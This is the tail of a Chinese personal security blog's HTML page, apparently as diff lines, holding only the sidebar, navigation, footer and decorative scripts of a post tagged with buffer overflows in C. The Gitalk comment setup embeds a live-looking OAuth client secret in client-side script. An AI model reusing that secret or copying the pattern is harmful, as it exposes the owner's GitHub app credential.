+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/缓冲区溢出-c语言/">缓冲区溢出 c语言</a></li></ul>
+
+    </footer>
+  </div>
+  
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2018/08/05/信息安全入门/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">信息安全入门</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">王六六的博客</h1>
+    <h2 class="blog-subtitle">山水一程，三生有幸。立德立言，无问西东。</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+          <a href="http://www.jilehui.top/" title="靶场">
+            <li>靶场</li>
+          </a>
+        
+          <a href="http://www.jilehui.top/wo.html" title="关于">
+            <li>关于</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="http://i1.bvimg.com/658463/5e7d7b6fc3890bcb.jpg">
+    <h2 class="author">王六六</h2>
+    <h3 class="description">It&#39;s raining cats and dogs.</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>6</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>5</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="" target="_blank" title="">
+          
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>链接导航</h2>
+      
+        <a class="hvr-bounce-in" href="http://www.jilehui.top/" target="_blank" title="测试靶场">
+          测试靶场
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://www.shentoushi.top/" target="_blank" title="渗透师">
+          渗透师
+        </a>
+      
+    </div>
+  </div>
+</div>
+<div id="music163player"  class="widget-wrap"> 
+	<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=226 height=86 src="//music.163.com/outchain/player?type=2&id=31861287&auto=0&height=66"></iframe>
+</div>
+
+
+
+  
+  <!--评论-->
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<div id="gitalk-container"></div>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '2f2a844c3f5c5a2c5519',
+        clientSecret: '7bd16f26ba0b9bd9667372b25e02531c89d916c4',
+        id: window.location.pathname,
+        repo: 'myblog_comment',
+        owner: 'wang66just6',
+        admin: 'wang66just6'
+    })
+    gitalk.render('gitalk-container')
+</script>
+</aside>
+
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2017 - 2018 王六六<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+	  <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("08/1/2018 12:49:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
+  <script src="/plugin/galmenu/GalMenu.js"></script>
+  <div class="GalMenu GalDropDown">
+      <div class="circle" id="gal">
+        <div class="ring">
+          
+            <a href="/" title="" class="menuItem">首页</a>
+          
+            <a href="/tags" title="" class="menuItem">标签</a>
+          
+            <a href="/categories" title="" class="menuItem">分类</a>
+          
+            <a href="/archives" title="" class="menuItem">归档</a>
+          
+            <a href="http://www.jilehui.top/wo.html" title="" class="menuItem">关于</a>
+          
+            <a href="http://www.jilehui.top/" title="" class="menuItem">靶场</a>
+          
+        </div>
+        
+          <audio id="audio" src="plugin/galmenu/wulusai.mp3"></audio>
+        
+      </div> 
+</div>
+<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
+  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
+    for (var i = 0,
+    l = items.length; i < l; i++) {
+      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+    }</script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $('body').GalMenu({
+      'menu': 'GalDropDown'
+    })
+  });
+</script>
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+  <!--背景线条-->
+	<script type="text/javascript" 
+	color="0,0,255" 
+	opacity='1' 
+	zIndex="-1" 
+	count="150" 
+	src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+	</script>
+  <!-- 页面点击小红心-->
+  <script type="text/javascript" >
+  !function(e,t,a){function n(){c(".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}"),o(),r()}function r(){for(var e=0;e<d.length;e++)d[e].alpha<=0?(t.body.removeChild(d[e].el),d.splice(e,1)):(d[e].y--,d[e].scale+=.004,d[e].alpha-=.013,d[e].el.style.cssText="left:"+d[e].x+"px;top:"+d[e].y+"px;opacity:"+d[e].alpha+";transform:scale("+d[e].scale+","+d[e].scale+") rotate(45deg);background:"+d[e].color+";z-index:99999");requestAnimationFrame(r)}function o(){var t="function"==typeof e.onclick&&e.onclick;e.onclick=function(e){t&&t(),i(e)}}function i(e){var a=t.createElement("div");a.className="heart",d.push({el:a,x:e.clientX-5,y:e.clientY-5,scale:1,alpha:1,color:s()}),t.body.appendChild(a)}function c(e){var a=t.createElement("style");a.type="text/css";try{a.appendChild(t.createTextNode(e))}catch(t){a.styleSheet.cssText=e}t.getElementsByTagName("head")[0].appendChild(a)}function s(){return"rgb("+~~(255*Math.random())+","+~~(255*Math.random())+","+~~(255*Math.random())+")"}var d=[];e.requestAnimationFrame=function(){return e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||function(e){setTimeout(e,1e3/60)}}(),n()}(window,document);
+  </script>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<!--color ：线条颜色, 默认: '0,0,0'；三个数字分别为(R,G,B);  opacity: 线条透明度（0~1）, 默认: 0.5;count: 线条的总数量, 默认: 150 ;zIndex: 背景的z-index属性，css属性用于控制所在层的位置, 默认: -1 -->
